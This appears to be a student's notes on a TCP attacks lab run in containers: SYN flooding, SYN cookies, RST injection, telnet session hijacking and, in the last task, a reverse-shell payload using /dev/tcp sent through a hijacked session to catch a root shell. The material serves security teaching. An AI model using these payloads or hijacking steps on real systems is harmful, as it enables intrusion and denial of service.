# TCP Attacks
## Task 1: SYN Flooding Attack
- SYN flood is a form of DoS attack in which attackers send many SYN requests to a victim's TCP port, but the attackers have no intention to finish the 3-way handshake procedure. Attackers either use spoofed IP address or do not continue the procedure
- Through this attack, attackers can flood the victim's queue that is used for half-opened connections, i.e., the connections that has finished SYN, SYN-ACK, but has not yet gotten a final ACK back
- the size of the queue has a system-wide setting, the OS sets this value based on the amount of the memory the system has, in Ubuntu OS:
    ```
    # sysctl net.ipv4.tcp_max_syn_backlog
    net.ipv4.tcp_max_syn_backlog = 512
    ```
- check the usage of the queue: `netstat -nat`, The state of half-connections is `SYN-RECV`, if the 3-way handshake is finished, the state will be `ESTABLISHED`
- **SYN Cookie Countermeasure**: By default, Ubuntu's SYN flooding countermeasure is turned on, called SYN cookie, it will kick in if the machine detects that it is under the SYN flooding attack
    - turn off: `sysctl -w net.ipv4.tcp_syncookies=0`
    - to be able to use `sysctl` to change the system variables, the container needs to be configured with `privileged: true` entry

### Task 1.1: Launching the Attack Using Python
- use `Scapy`, keep sending TCP packets (with flag 'S') to the victim server (`10.9.0.5`)
    - `tcp = TCP(dport=23, flags='S')`
    - source IP address and port can be randomly generated

- possible issues
    - *TCP cache*: if machine X has already made a TCP connection to the victim machine, then X seems to be "immune" to the SYN flooding attack, and can successfully connect to the victim, this is due to a kernel mitigation mechanism, TCP reserves `1/4` OF THE backlog queue for those proven destinations if SYN Cookies are disabled, if an IP is cached, it will use the reserved slots when connecting
        - check TCP cache `# ip tcp_metrics show`
        - clear TCP cache `# ip tcp_metrics flush`
    - *RST packets*: when doing this task using 2 VMs, instead of containers, from Wireshark, we can notice many RST packets, they are generated by the NAT server, any traffic going out of the VM will go through the NAT server provided by VirtualBox, for TCP, NAT creates address translation entries based on the SYN packet. In this attack, the SYN packets generated by attacker didn't go through the NAT, so no NAT entry was created, when the victim sends SYN+ACK packet back, this packet will go through the NAT, but because there is no prior NAT entry for this TCP connection, NAT does not know what to do, so it sends a TCP RST packet back to the victim, and the victim will remove the data from the queue
    - *TCP retransmission issue*: After sending SYN+ACK packet, the victim will wait for ACK packet, if it does not come on time, TCP will retransmit the SYN+ACK packet, how many times it will retry depends on the setting. After 5 retries, TCP will remove the corresponding item from the half-connection queue
        ```
        # sysctl net.ipv4.tcp_synack_retries
        net.ipv4.tcp_synack_retrie = 5
        ```

- set the size of the queue smaller, `# sysctl net.ipv4.tcp_max_syn_backlog=80` (the original queue size `512` is too large, the Python program is not fast enough to keep the queue always full, and the user can finally connect to the victim server after a period of time)
- run the attack program, on user-1 `10.9.0.6`, `telnet 10.9.0.5 23`, it will not be able to connect to the victim server
    ```
    # telnet 10.9.0.5 23
    Trying 10.9.0.5...
    telnet: Unable to connect to remote host: Connection timed out
    ```
### Task 1.2: Launch the Attack Using C
- C is faster than Python, write raw sockets using C, and keep spoofing TCP SYN packets (refer to the Packet Sniffing and Spoofing Lab)
- restore the queue size `# sysctl net.ipv4.tcp_max_syn_backlog=512`
- the rate of success is much higher than the Python program when using the original queue size `512`
### Task 1.3: Enable SYN Cookie Countermeasure
- on the victim server: `sysctl -w net.ipv4.tcp_syncookies=1`
- run `synflood` program, the user can successfully telnet to the server
- on the server: `netstat -nat`, there will be a lot of half-connections
- on the user: `telnet 10.9.0.5 23`, successfully connected immediately
- SYN cookie: when receiving the SYN packet, the server will calculate a syn cookie, send it back to the client in the SYN+ACK packet, when it receives an ACK packet, it will validate the syn cookie

## Task 2: TCP RST Attacks on telnet Connections
- the TCP RST attacke can terminate an established TCP connection between two victims
- the attacker needs to correctly construct the TCP RST packet, i.e., we need the correct sequence number
- *launch the attack automatically*
    - sniffing for a period of time (e.g., 10 seconds)
    - finally, use the ACK of the latest packet as the sequence number of the spoofed RST packet

- after the RST packet is sent, on the user container: `Connection closed by foreign host.`

## Task 3: TCP Session Hijacking
- the objective of the TCP Session Hijacking attack is to hijack an existing TCP connection between two victims by injecting malicious contens into this session, if the connection is a `telnet` session, attackers can inject malicious commands
- launching the attack manually: skipped, it is trivial to modify the program that launches the attack automatically to launch the attack manually
- *launching the attack automatically*: the key is to fill in the right SEQ and ACK
    - sniff TCP packet from server to client (`"tcp and src host 10.9.0.5 and src port 23"`)
    - then send a spoofed TCP packet containing the malicious command `touch malicious_file`
    - the SEQ of the packet: `rcvd_pkt[TCP].ack`
    - the ACK of the packet: `rcvd_pkt[TCP].seq+1`
    - after the user connects to the server, run the program on attacker machine
    - as long as the user send another packet, the session will be hijacked
    - on the server
        ```
        # cd ~
        # ls
        malicious_file
        ```
## Task 4: Creating Reverse Shell using TCP Session Hijacking
- the program is the same as in task `3`, except that we need to change the data field to a command that triggers a reverse shell to the attacker's machine
- use this payload `\r /bin/bash -i >& /dev/tcp/10.9.0.1/9875 0>&1 \r`
- listen to the port `9875` on the attacker's machine, after the user connects to the server, run the program on attacker machine, as long as the user send another packet, the session will be hijacked
    ```
    # nc -l 9875
    root@3afa2e9a2320:~# <---- get a reverse shell from the victim server
    ```
